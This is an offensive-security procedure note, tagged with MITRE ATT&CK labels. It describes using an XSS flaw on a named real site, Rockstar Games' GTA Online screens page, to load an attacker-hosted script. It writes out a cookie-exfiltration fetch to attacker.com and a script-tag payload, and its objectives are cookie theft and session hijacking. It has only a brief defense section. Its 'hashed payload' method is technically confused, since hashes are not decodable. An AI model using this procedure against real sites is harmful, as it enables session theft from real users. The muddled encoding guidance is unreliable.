---
tags:
  - xss
  - web
  - payload-crafting
  - script-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:04.027Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: b7395d02-d241-4f4c-9548-f3600d587b2f
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Hashed-Payload-to-Load-External-Script

## Summary

This procedure details crafting a hashed payload to bypass URL processing and inject an external script into the Rockstar Games GTA Online screens page, exploiting the XSS vulnerability to execute JavaScript for actions like cookie theft.

## Description

The target environment is the web application at https://www.rockstargames.com/GTAOnline/jp/screens/, where URL path content is decoded without validation. Using a hashing strategy, an attacker encodes a malicious script tag to load external JS, which can exfiltrate data. This requires knowledge of the application's decoding mechanism and a controlled external server. Outcomes include successful script execution, enabling session hijacking or defacement.

## Requirements

1. Confirmed vulnerable endpoint from prior reconnaissance
2. External server to host the malicious script (e.g., attacker-controlled domain)
3. Tools for hashing/encoding payloads (browser console or online hash generators)

## Defense

Defensive measures and detection strategies:

- Enforce strict URL decoding with whitelisting of allowed paths
- Deploy Web Application Firewall (WAF) rules to block hashed or encoded script injections
- Log and alert on external resource loads from user-controlled inputs

## Objectives

1. Inject and execute external JavaScript via URL manipulation
2. Achieve data exfiltration such as cookies
3. Demonstrate impact like session hijacking

## Instructions

### Step 1: Prepare External Script

**Context**: Host a malicious JS file on an external server to be loaded by the payload.

Upload a simple script like function exfil(){ fetch('https://attacker.com/steal?cookie='+document.cookie); } exfil(); to https://attacker.com/malicious.js.

> Ensure the script is accessible and tests for cookie access in a safe environment.

### Step 2: Craft Hashed Payload

**Context**: Encode the script injection to bypass any basic filters using hashing.

In the browser console or a tool, generate a hash that, when decoded by the application, resolves to <script src="https://attacker.com/malicious.js"></script>. For example, if the app uses a specific hash function, compute the value accordingly and URL-encode it.

> The exact hashing strategy depends on observed decoding; test iterations until it loads.

### Step 3: Inject and Execute

**Context**: Append the payload to the vulnerable URL and trigger execution.

Construct the full URL: https://www.rockstargames.com/GTAOnline/jp/screens/[hashed-payload]. Load it and check the network tab for the external script fetch and console for execution.

> Verify success by observing any alerts or exfiltrated data on the attacker's server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[web]]
- [[payload-crafting]]
